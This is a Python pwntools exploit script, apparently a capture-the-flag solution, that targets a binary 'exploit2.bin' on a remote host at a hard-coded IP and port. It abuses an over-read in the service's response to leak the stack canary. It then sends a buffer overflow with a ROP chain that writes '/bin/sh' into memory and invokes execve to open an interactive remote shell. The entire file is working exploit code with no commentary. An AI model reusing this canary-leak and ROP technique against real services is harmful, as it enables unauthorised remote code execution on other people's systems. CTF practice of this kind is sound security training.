from pwn import *
context.binary = "./exploit2.bin"
#p = process()
p = remote("34.123.210.162",20233)
script = """
b*main+122
b*main+186
c
"""
#gdb.attach(p,script)
push_rsp = 0x0000000000425b79
pop_rdi = 0x00000000004018e2
pop_rsi = 0x000000000040f30e
mov_rdi_rsi = 0x000000000044e600
write = 0x004e1240+0x100
pop_rdx = 0x00000000004017ef
syscall = 0x00000000004012e3
pop_rax = 0x0000000000451fd7
payload = b'1040:' + b'A'
p.sendline(payload)
p.recvuntil(b'response...\n')
p.recv(1032)
leak_canary = u64(p.recv(8).ljust(8,b'\x00'))
log.info("Leak canary: %s", hex(leak_canary))
p.recv()
payload2 = b'0:' + b'A'*1032 + p64(leak_canary) +b'B'*8 +  p64(pop_rsi) + p64(0x69622f2f)
payload2 += p64(pop_rdi) + p64(write)
payload2 += p64(mov_rdi_rsi)
payload2 += p64(pop_rsi) + p64(0x68732f6e) 
payload2 += p64(pop_rdi) + p64(write+4)
payload2 += p64(mov_rdi_rsi) 
payload2 += p64(pop_rdi) + p64(write)
payload2 += p64(pop_rsi) + p64(0x0)
payload2 += p64(pop_rdx) + p64(0x0)
payload2 += p64(pop_rax) + p64(0x3b)
payload2 += p64(syscall)
p.sendline(payload2)
p.interactive()